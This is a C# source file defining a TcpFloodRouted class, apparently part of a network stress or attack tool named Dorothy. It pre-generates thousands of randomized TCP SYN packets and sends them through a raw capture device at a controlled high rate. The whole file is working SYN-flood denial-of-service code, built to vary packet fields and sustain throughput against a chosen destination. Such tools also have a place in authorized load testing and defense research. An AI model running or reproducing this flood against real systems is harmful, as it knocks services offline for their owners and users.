using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFloodRouted : FloodAttack
    {
        private const int BATCH_SIZE = 5000;
        private const int MICRO_BATCH_SIZE = 500;
        private const int PACKET_POOL_SIZE = 10000;
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly Random _random = new();

        public TcpFloodRouted(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _parameters = parameters;
            _cancellationToken = cancellationToken;
        }

        public override async Task StartAsync()
        {
            try
            {
                using var device = GetDevice();
                device.Open(DeviceModes.Promiscuous, 1000);

                // Pre-generate a large pool of packets for better variety
                var packetPool = new byte[PACKET_POOL_SIZE][];
                Parallel.For(0, PACKET_POOL_SIZE, i =>
                {
                    packetPool[i] = CreateTcpSynPacket();
                });

                // Calculate packets needed per second to achieve target rate
                var packetSize = 54 + 14 + 20; // Ethernet + IP + TCP headers
                var packetsPerSecond = _parameters.BytesPerSecond / packetSize;
                var microBatchDelay = TimeSpan.FromSeconds(1.0 * MICRO_BATCH_SIZE / packetsPerSecond);

                var stopwatch = new Stopwatch();
                var packetsSent = 0L;
                var lastRateCheck = DateTime.UtcNow;
                var currentBatch = 0;
                var poolIndex = 0;

                while (!_cancellationToken.IsCancellationRequested)
                {
                    stopwatch.Restart();

                    // Send a micro-batch of packets
                    for (int i = 0; i < MICRO_BATCH_SIZE && !_cancellationToken.IsCancellationRequested; i++)
                    {
                        device.SendPacket(packetPool[poolIndex]);
                        poolIndex = (poolIndex + 1) % PACKET_POOL_SIZE;
                        packetsSent++;
                    }

                    currentBatch++;
                    
                    // After sending BATCH_SIZE packets, regenerate part of the pool
                    if (currentBatch >= (BATCH_SIZE / MICRO_BATCH_SIZE))
                    {
                        // Regenerate 20% of the pool in parallel for variety
                        var updateSize = PACKET_POOL_SIZE / 5;
                        var startIdx = _random.Next(0, PACKET_POOL_SIZE - updateSize);
                        Parallel.For(startIdx, startIdx + updateSize, i =>
                        {
                            packetPool[i] = CreateTcpSynPacket();
                        });
                        currentBatch = 0;
                    }

                    // Precise rate control with reduced delays
                    var elapsedMicros = stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency;
                    var targetMicros = (long)(microBatchDelay.TotalSeconds * 1_000_000);
                    
                    if (elapsedMicros < targetMicros)
                    {
                        var remainingMicros = targetMicros - elapsedMicros;
                        if (remainingMicros > 500)
                        {
                            await Task.Delay(TimeSpan.FromMicroseconds(remainingMicros - 250));
                        }
                        // Shorter spin wait
                        while (stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency < targetMicros)
                        {
                            Thread.SpinWait(1);
                        }
                    }

                    // Log rate every second
                    var now = DateTime.UtcNow;
                    if ((now - lastRateCheck).TotalSeconds >= 1)
                    {
                        var rate = packetsSent / (now - lastRateCheck).TotalSeconds;
                        var actualMbps = (rate * packetSize * 8) / 1_000_000;
                        Debug.WriteLine($"Sending rate: {rate:F0} packets/second ({actualMbps:F2} Mbps)");
                        packetsSent = 0;
                        lastRateCheck = now;
                    }
                }
            }
            catch (OperationCanceledException)
            {
                // Normal cancellation, ignore
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in TCP flood: {ex.Message}");
                throw;
            }
        }

        private byte[] CreateTcpSynPacket()
        {
            // Create randomized values for better packet distribution
            var sourcePort = (ushort)_random.Next(49152, 65535);
            var ttl = (byte)_random.Next(64, 128);
            var windowSize = (ushort)_random.Next(8192, 65535);
            var seqNum = (uint)_random.Next();

            // Create the TCP packet with SYN flag
            var tcpPacket = new TcpPacket(sourcePort, (ushort)_parameters.DestinationPort)
            {
                SequenceNumber = seqNum,
                WindowSize = windowSize,
                Flags = 0x02, // SYN flag
                Checksum = 0
            };

            // Create the IP packet
            var ipPacket = new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                TimeToLive = ttl,
                Protocol = ProtocolType.Tcp,
                Id = (ushort)_random.Next(0, 65535),
                Checksum = 0
            };

            // Create the Ethernet frame
            var sourceMac = new PhysicalAddress(_parameters.SourceMac);
            var destMac = new PhysicalAddress(_parameters.DestinationMac);
            var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);

            // Stack the packets
            ipPacket.PayloadPacket = tcpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            // Calculate checksums
            tcpPacket.UpdateTcpChecksum();
            ipPacket.UpdateIPChecksum();

            return ethernetPacket.Bytes;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Cleanup if needed
            }
            base.Dispose(disposing);
        }
    }
}